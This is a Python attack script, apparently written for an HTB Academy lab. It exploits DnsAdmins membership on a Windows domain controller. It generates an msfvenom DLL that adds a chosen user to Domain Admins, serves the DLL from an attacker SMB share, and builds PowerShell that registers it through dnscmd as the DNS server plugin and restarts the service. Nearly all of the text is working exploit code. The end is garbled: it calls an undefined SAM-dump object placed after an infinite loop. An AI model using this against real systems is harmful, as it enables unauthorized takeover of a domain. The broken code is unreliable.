# This example can be used for DnsAdmin users
# Tested on HTB Academy

import os

from payload import CRunPowershellExe
from tempsmbserver import TempSMB

local_ip = "10.10.16.101"

with TempSMB(local_ip=local_ip, set_credentials=True, smb2=True) as smb:
    """This only works on DC on HTB kekw"""

    user_to_elevate = "netadm"
    """copy your msfvenom shit here!"""
    exploit_dll = smb.create_temp_file("placeholder for msfvenom", ext=".dll")
    os.system(f"""msfvenom -p windows/x64/exec cmd='net group "domain admins" {user_to_elevate} /add /domain' -f dll -o {exploit_dll.local_path}""")

    check_dns_registry_key = f"reg query HKLM\\SYSTEM\\CurrentControlSet\\Services\\DNS\\Parameters /v ServerLevelPluginDll"
    check_dns_registry_keys = f"reg query HKLM\\SYSTEM\\CurrentControlSet\\Services\\DNS\\Parameters"

    check_group_memberships = f"Get-ADGroupMember -Identity DnsAdmins"

    copy_dll_cringe = f"cp {exploit_dll.remote_path} ."
    change_dns_service_dll = f"dnscmd.exe /config /serverlevelplugindll $(join-path $pwd {exploit_dll.base_name})"
    restart_service = f"sc.exe stop dns\nsleep 10\nsc.exe start dns\nsleep 10"
    delete_dll = f"rm $(join-path $pwd {exploit_dll.base_name})"
    whoami = 'net group "domain admins" /dom'
    exploit_powershell = "\n".join((check_dns_registry_keys, check_dns_registry_key, check_group_memberships, copy_dll_cringe, change_dns_service_dll,restart_service, whoami))
    exploit_powershell = smb.create_temp_file(exploit_powershell, ext=".ps1")

    exploit_exe = CRunPowershellExe(smb, [exploit_powershell])

    print(f"{"="*10}ANGRY SMB READY{"="*10}")
    print(exploit_exe.file.remote_path)
    print(f"{"="*10}waiting{"="*10}")

    import time

    while True: time.sleep(5)

    sam_dump_payload.await_output_files()

    try:
        dump(sam_dump_payload.sam.local_path, sam_dump_payload.system.local_path, sam_dump_payload.security.local_path)
    except Exception as e:
        print(e)
        print("Sleep timer for awaiting the dumped files might be too short")
